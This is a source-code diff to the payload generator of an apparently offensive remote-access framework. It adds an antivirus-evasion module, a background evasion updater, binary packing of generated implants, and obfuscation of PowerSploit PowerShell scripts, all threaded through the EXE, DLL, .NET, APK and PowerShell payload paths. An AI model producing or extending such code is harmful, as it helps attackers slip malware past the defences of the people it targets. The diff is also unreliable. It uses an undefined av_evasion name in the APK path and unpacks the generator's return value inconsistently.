@@ -52,6 +52,8 @@ from ghost.scriptlets import (
     load_scriptlets, ScriptletsPacker, ScriptletArgumentError
 )
 from ghost.modules.lib.windows.powershell import obfuscatePowershellScript
+from ghost.ghostlib.utils.antivirus_evasion import AntivirusEvasion
+from ghost.ghostlib.utils.antivirus_evasion_update import AntivirusEvasionUpdater
 from ghost.ghostlib.GhostCredentials import Credentials, EncryptionError
 from ghost.network.lib.convcompat import reprb
 
@@ -355,7 +357,7 @@ def get_edit_apk(target, display, path, conf):
 
     try:
         packed_payload = pack_py_payload(
-            target, display, get_raw_conf(display, conf), autostart=False
+            target, display, get_raw_conf(display, conf), autostart=False, av_evasion=av_evasion
         )
 
         shutil.copy(path, tempapk)
@@ -401,7 +403,7 @@ def get_edit_apk(target, display, path, conf):
 
 
 def generate_ps1(
-        display, conf, target, outpath=False, output_dir=False, as_str=False):
+        display, conf, target, av_evasion, outpath=False, output_dir=False, as_str=False):
 
     SPLIT_SIZE = 100000
 
@@ -439,7 +441,7 @@ def generate_ps1(
 
     display(Success('{0} variables used'.format(i + 1)))
 
-    script = obfuscatePowershellScript(
+    script = av_evasion.obfuscate_powershell_script(
         open(
             os.path.join(
                 ROOT, 'external', 'PowerSploit',
@@ -490,7 +492,7 @@ def generate_ps1(
 
 
 def generate_binary_from_template(
-        display, conf, target, shared=False, fmt=None):
+        display, conf, target, shared=False, fmt=None, av_evasion=None):
 
     config = GhostConfig()
     
@@ -592,9 +594,27 @@ def generate_binary_from_template(
         )
     )
 
-    return generator(
+    binary_data, filename, makex = generator(
         target, display, template, conf
-    ), filename, makex
+    )
+    
+    # Save binary to temporary file for packing
+    if av_evasion and not shared:
+        with tempfile.NamedTemporaryFile(suffix='.' + filename.split('.')[-1], delete=False) as tmp:
+            tmp.write(binary_data)
+            tmp_path = tmp.name
+        
+        # Pack the binary
+        av_evasion.pack_binary(tmp_path)
+        
+        # Read back the packed binary
+        with open(tmp_path, 'rb') as tmp:
+            binary_data = tmp.read()
+        
+        # Clean up
+        os.unlink(tmp_path)
+    
+    return binary_data, filename, makex
 
 
 def pack_scriptlets(
@@ -798,6 +818,17 @@ def get_parser(base_parser, config):
 
 def ghostgen(args, config, pupsrv, display):
     scriptlets = load_scriptlets(args.os, args.arch)
+    
+    # Initialize antivirus evasion module
+    av_evasion = AntivirusEvasion(config)
+    # Check for updates to evasion techniques
+    av_evasion.check_for_updates()
+    display(Info(f'Using evasion techniques: {av_evasion.get_evasion_status()}'))
+    
+    # Start antivirus evasion updater
+    av_updater = AntivirusEvasionUpdater(config)
+    av_updater.start()
+    display(Info(f'Antivirus evasion updater started: {av_updater.get_status()}'))
 
     if args.list:
         display(MultiPart([
@@ -1000,7 +1031,7 @@ def ghostgen(args, config, pupsrv, display):
             fmt='ghost{arch}-{pyver}.pyoxidizer.{ext}'
 
         data, filename, makex = generate_binary_from_template(
-            display, conf, target, shared=args.shared, fmt=fmt
+            display, conf, target, shared=args.shared, fmt=fmt, av_evasion=av_evasion
         )
 
         if not outpath:
@@ -1065,7 +1096,7 @@ def ghostgen(args, config, pupsrv, display):
 
         packed_payload = pack_py_payload(
             target, display,
-            get_raw_conf(display, conf, verbose=True), purepy=True
+            get_raw_conf(display, conf, verbose=True), purepy=True, av_evasion=av_evasion
         )
 
         outfile.write(
@@ -1084,7 +1115,7 @@ def ghostgen(args, config, pupsrv, display):
             target, display, get_raw_conf(
                 display, conf, verbose=True
             ),
-            purepy=True
+            purepy=True, av_evasion=av_evasion
         )
 
         if not isinstance(packed_payload, bytes):
@@ -1112,7 +1143,7 @@ def ghostgen(args, config, pupsrv, display):
             raise ValueError('This format only supports windows')
 
         rawdll = generate_binary_from_template(
-            display, conf, target, shared=True
+            display, conf, target, shared=True, av_evasion=av_evasion
         )[0]
 
         dn = DotNetPayload(
@@ -1127,7 +1158,7 @@ def ghostgen(args, config, pupsrv, display):
             raise ValueError('This format only supports windows')
 
         rawdll = generate_binary_from_template(
-            display, conf, target, shared=True
+            display, conf, target, shared=True, av_evasion=av_evasion
         )[0]
 
         dn = DotNetPayload(
@@ -1152,7 +1183,7 @@ def ghostgen(args, config, pupsrv, display):
             pass
 
         rawdll = generate_binary_from_template(
-            display, conf, target, shared=True
+            display, conf, target, shared=True, av_evasion=av_evasion
         )[0]
 
         dotnet_serve_payload(display, pupsrv, rawdll, conf, link_ip=link_ip)
@@ -1164,7 +1195,7 @@ def ghostgen(args, config, pupsrv, display):
             raise ValueError('This format only supports windows')
 
         outpath = generate_ps1(
-            display, conf, target,
+            display, conf, target, av_evasion,
             outpath=outpath, output_dir=args.output_dir
         )
 
